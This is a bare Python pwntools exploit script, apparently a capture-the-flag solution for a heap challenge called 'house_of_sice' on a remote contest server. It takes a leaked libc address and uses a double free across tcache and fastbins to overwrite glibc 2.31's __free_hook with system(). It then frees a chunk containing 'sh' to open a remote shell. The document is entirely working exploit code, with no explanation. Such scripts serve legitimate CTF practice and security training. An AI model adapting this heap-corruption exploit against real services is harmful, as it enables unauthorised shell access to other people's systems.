from pwn import *

#p = process('./house_of_sice')
p = remote('house-of-sice.hsc.tf','1337')
elf = ELF('./house_of_sice')
#libc=elf.libc
libc = ELF('./libc-2.31.so')

def malloc(con):
    p.sendlineafter('> ',str(1))
    p.sendlineafter('> ',str(1))
    p.sendlineafter('> ',str(con))

def calloc(con):
    p.sendlineafter('> ',str(1))
    p.sendlineafter('> ',str(2))
    p.sendlineafter('> ',str(con))

def free(idx):
    p.sendlineafter('> ',str(2))
    p.sendlineafter('> ',str(idx))

p.recvuntil('As per tradition, we shall sice you a complimentary deet: ')
system =  int(p.recvline(),16)
libc_base = system-libc.sym['system']
p.info('libc_base: '+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']

for i in range(10):
    malloc(i)
for i in range(8):
    free(i)
free(8)
free(7)
malloc(10)
malloc(11)
calloc(free_hook) #12
malloc(0x6873) #13
malloc(system)
free(13)

#gdb.attach(p)
p.interactive()

    